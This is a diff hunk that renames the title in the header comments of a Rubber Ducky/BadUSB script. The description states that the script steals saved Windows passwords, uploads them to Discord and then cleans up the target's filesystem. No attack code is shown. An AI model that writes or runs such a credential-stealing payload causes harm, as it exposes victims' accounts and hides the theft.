@@ -1,4 +1,4 @@
-REM Title:          Windows Browsers Saved Passwords to Discord 
+REM Title:          Windows saved Passwords to Discord (P2D)
 REM Description:    Rubber Ducky/BadUSB script to grab saved passwords, write to a file and then upload to Discord. Cleans up the targets filesystem and exits.
 REM Author:         Tsali
 REM Props:          Hak5 Team, Jakoby
